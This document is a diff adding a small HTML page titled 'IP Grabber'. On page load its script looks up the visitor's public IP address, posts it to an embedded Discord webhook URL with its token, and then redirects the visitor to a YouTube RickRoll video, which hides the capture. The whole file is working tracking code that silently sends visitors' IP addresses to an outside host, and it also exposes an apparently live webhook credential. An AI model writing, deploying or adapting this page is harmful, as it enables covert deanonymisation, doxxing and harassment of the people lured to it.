@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Grabber</title>
+    <script>
+        function grabAndSendIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    const webhookUrl = 'https://discord.com/api/webhooks/1423474255311540255/p2Xs07HWQrYY1qjF5ucDsTShpficwv_Cr3Bsxg732w28_I2e5H4NGM4Q06B1KxVm0FBm';  // Replace with your actual Discord webhook URL
+                    const payload = {
+                        content: `IP Address: ${ipAddress}`
+                    };
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                })
+                .catch(error => console.error('Error grabbing IP:', error));
+        }
+
+        window.onload = function() {
+            grabAndSendIP();
+            window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';  // RickRoll redirect
+        };
+    </script>
+</head>
+<body>
+    <h1>IP Grabber</h1>
+</body>
+</html>
